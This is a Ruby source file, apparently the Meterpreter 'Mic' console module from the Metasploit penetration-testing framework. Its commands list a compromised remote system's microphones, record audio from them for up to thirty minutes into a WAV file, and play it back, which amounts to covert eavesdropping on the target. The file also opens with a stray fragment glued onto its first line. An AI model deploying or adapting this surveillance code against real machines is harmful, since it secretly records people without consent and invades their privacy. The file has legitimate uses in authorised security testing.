class Mic
end# -*- coding: binary -*-
require 'rex/post/meterpreter'
require 'bindata'

module Rex
  module Post
    module Meterpreter
      module Ui

        ###
        #
        # Mic - Capture audio from the remote system
        #
        ###
        class Console::CommandDispatcher::Stdapi::Mic
          Klass = Console::CommandDispatcher::Stdapi::Mic

          include Console::CommandDispatcher

          #
          # List of supported commands.
          #
          def commands
            {
                'mic_start'             => 'play an audio stream from the specified mic',
                'mic_stop'              => 'stop capturing audio from device',
                'list_audio_interfaces' => 'list all audio interfaces',
                'listen'                => 'listen to audio via audio player'
            }
          end

          #
          # Name for this dispatcher
          #
          def name
            "Stdapi: Mic"
          end

          def cmd_list_audio_interfaces
            client.mic.mic_list
            if client.mic.mic_list.length == 0
              print_error("No mics were found")
              return
            end

            client.mic.mic_list.each_with_index do |name, indx|
              print_line("#{indx + 1}: #{name}")
            end
          end

          def cmd_mic_start(index=0, start_delay=4096, play_audio=true)
            print_status("Streaming mic audio channel...")

            if client.mic.mic_list.length == 0
              print_error("Target does not have a mic")
              return
            end

            print_status("Starting...")
            stream_path = Rex::Text.rand_text_alpha(8) + ".wav"
            duration = 1800
            quality  = 50

            print_status("Audio File: #{stream_path}")
            print_status("Streaming...")

            begin
              client.mic.mic_start(index)
              mic_started = true
              ::Timeout.timeout(duration) do
                ::File.open(stream_path, 'wb') do |outfd|
                  numchannels = 1
                  sampleratehz = 11025
                  bitspersample = 16
                  datasize = 2000000000
                  subchunk1size = 16
                  chunksize = 4 + (8 + subchunk1size) + (8 + datasize)
                  byterate = sampleratehz * numchannels * bitspersample / 8
                  blockalign = numchannels * bitspersample / 8

                  BinData::Int32be.new(0x52494646).write(outfd)    # ChunkID: "RIFF"
                  BinData::Int32le.new(chunksize).write(outfd)     # ChunkSize
                  BinData::Int32be.new(0x57415645).write(outfd)    # Format: "WAVE"
                  BinData::Int32be.new(0x666d7420).write(outfd)    # SubChunk1ID: "fmt "
                  BinData::Int32le.new(16).write(outfd)            # SubChunk1Size
                  BinData::Int16le.new(1).write(outfd)             # AudioFormat
                  BinData::Int16le.new(numchannels).write(outfd)   # NumChannels
                  BinData::Int32le.new(sampleratehz).write(outfd)  # SampleRate
                  BinData::Int32le.new(byterate).write(outfd)      # ByteRate
                  BinData::Int16le.new(blockalign).write(outfd)    # BlockAlign
                  BinData::Int16le.new(bitspersample).write(outfd) # BitsPerSample
                  BinData::Int32be.new(0x64617461).write(outfd)    # SubChunk2ID: "data"
                  BinData::Int32le.new(datasize).write(outfd)      # SubChunk2Size
                end
                stream_index = 0
                while client do
                  if play_audio && (stream_index == start_delay)
                    cmd_listen(stream_path)
                  end
                  data = client.mic.mic_get_frame(quality)
                  if data
                    ::File.open(stream_path, 'a') do |f|
                      f.write(data)
                    end
                    data = nil
                  end
                  stream_index += 1
                end
              end
            rescue ::Timeout::Error
            ensure
              client.mic.mic_stop if mic_started
            end
          end

          def cmd_mic_stop(index=0)
            client.mic.mic_stop(index)
          end

          def cmd_listen(stream_path)
            Rex::Compat.open_webrtc_browser("file://#{::File.absolute_path(stream_path)}")
          end
        end
      end
    end
  end
end
